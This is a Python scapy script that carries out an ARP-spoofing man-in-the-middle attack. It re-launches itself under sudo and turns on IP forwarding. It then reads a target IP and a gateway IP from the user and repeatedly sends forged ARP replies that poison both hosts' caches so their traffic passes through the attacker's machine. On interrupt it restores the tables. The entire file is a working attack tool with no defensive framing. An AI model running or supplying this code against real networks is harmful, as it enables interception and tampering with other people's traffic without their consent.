import scapy.all as scapy
import os
import sys
import time
import logging

logging.basicConfig(filename='spoofing.log', level=logging.DEBUG,
                    format='%(asctime)s:%(levelname)s:%(message)s')


def become_root():
    euid = os.geteuid()
    if euid != 0:
        print("Script not started as root. Running sudo..")
        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        os.execlpe('sudo', *args)

    print('Running. Your euid is', + euid)
    print("---------------------------------------------------------")



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_ether_broadcast = broadcast_frame / arp_request
    answered_list = scapy.srp(arp_ether_broadcast, timeout=1, verbose=False)[0]  # we need only answered list
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    logging.debug('MAC address of Target machine = {}'.format(target_mac))
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,
                       hwsrc=source_mac)  # Need tp specify source MAC
    scapy.send(packet, count=4, verbose=False)


#  sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sent_packets = 0


def run_spoof():
    os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
    global sent_packets
    become_root()
    target_ip = input("Enter the target ip you want to spoof: ")
    gateway_ip = input("\nEnter the IP address of the Gateway: ")
    logging.debug('Target IP Address = {}'.format(target_ip))
    logging.debug('Gateway IP Address = {}'.format(gateway_ip))
    try:
        while True:
            spoof(target_ip, gateway_ip)  # Tell the target that we are the router
            spoof(gateway_ip, target_ip)  # Tell the router that we are the target
            sent_packets = sent_packets + 2
            print("\r[+] Packets Sent " + str(sent_packets))
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Keyboard Interrupt CTRL + C Detected...Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


